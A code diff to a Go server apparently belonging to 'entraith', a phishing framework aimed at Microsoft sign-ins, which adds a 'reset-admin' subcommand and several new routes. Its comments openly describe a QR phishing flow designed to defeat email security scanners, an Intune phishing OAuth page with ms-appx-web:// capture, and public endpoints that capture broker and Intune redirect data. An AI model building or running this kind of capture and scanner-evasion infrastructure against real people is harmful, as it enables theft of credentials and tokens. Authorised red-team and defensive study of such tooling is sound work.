@@ -78,6 +78,8 @@ func main() {
 		runServer()
 	case "validate":
 		runValidate()
+	case "reset-admin":
+		runResetAdmin()
 	case "version":
 		fmt.Println("entraith v0.2.0")
 	default:
@@ -248,14 +250,26 @@ func runServer() {
 	// API routes
 	mux.Handle("/api/", apiHandler.Routes())
 
+	// Webhook listener control
+	mux.Handle("/webhook/", apiHandler.Routes())
+
 	// QR phishing — two-phase flow to defeat email security scanners.
 	// GET  serves an inert JS page; POST /confirm is the real trigger.
 	qrGet, qrConfirm := apiHandler.QRScanHandler()
 	mux.HandleFunc("GET /qr/{token}", qrGet)
 	mux.HandleFunc("POST /qr/{token}/confirm", qrConfirm)
 
+	// Intune phishing — single-page OAuth login with ms-appx-web:// capture
+	mux.HandleFunc("GET /intune/{token}", apiHandler.HandleIntuneLanding())
+
 	// Webhook / telemetry receiver
 	mux.Handle("/receive", apiHandler.Routes())
+
+	// Native Broker Interop — public endpoint for URI capture
+	mux.HandleFunc("POST /capture", apiHandler.CaptureBroker())
+
+	// Intune capture — public endpoint for ms-appx-web:// capture from landing page
+	mux.HandleFunc("POST /intune/capture", apiHandler.CaptureIntune)
 
 	// Health check
 	mux.HandleFunc("GET /health", func(w http.ResponseWriter, r *http.Request) {
@@ -310,4 +324,48 @@ func runValidate() {
 	fmt.Printf("  Scope         : %s\n", cfg.Campaign.Scope)
 	fmt.Printf("  Poll Interval : %ds\n", cfg.Campaign.PollInterval)
 	fmt.Printf("  Artifacts     : %s\n", cfg.Storage.ArtifactsPath)
+}
+
+func runResetAdmin() {
+	fs := flag.NewFlagSet("reset-admin", flag.ExitOnError)
+	cfgPath := fs.String("config", "", "path to config")
+	fs.Parse(subArgs())
+	resolvedCfg := resolveConfig(fs, cfgPath)
+	if resolvedCfg == "" {
+		fmt.Fprintf(os.Stderr, "error: config file required\n")
+		fmt.Fprintf(os.Stderr, "usage: entraith reset-admin <config>\n")
+		os.Exit(1)
+	}
+
+	cfg, err := config.Load(resolvedCfg)
+	if err != nil {
+		log.Fatalf("Failed to load config: %v", err)
+	}
+
+	dataPath := filepath.Dir(cfg.Storage.ArtifactsPath)
+	dbPath := filepath.Join(dataPath, "entraith.db")
+	db, err := store.New(dbPath)
+	if err != nil {
+		log.Fatalf("Failed to open database: %v", err)
+	}
+	defer db.Close()
+
+	user, err := db.GetUserByUsername("admin")
+	if err != nil || user == nil {
+		log.Fatalf("Admin user not found — run 'entraith server' first to create it")
+	}
+
+	newPassword := auth.GeneratePassword(16)
+	newSalt := auth.GenerateSalt()
+	newHash := auth.HashPassword(newPassword, newSalt)
+
+	if err := db.UpdateUserPassword("admin", newHash, newSalt); err != nil {
+		log.Fatalf("Failed to reset password: %v", err)
+	}
+
+	log.Printf("╔══════════════════════════════════════════════╗")
+	log.Printf("║         ADMIN PASSWORD RESET                ║")
+	log.Printf("║  Username : admin                            ║")
+	log.Printf("║  Password : %-32s ║", newPassword)
+	log.Printf("╚══════════════════════════════════════════════╝")
 }
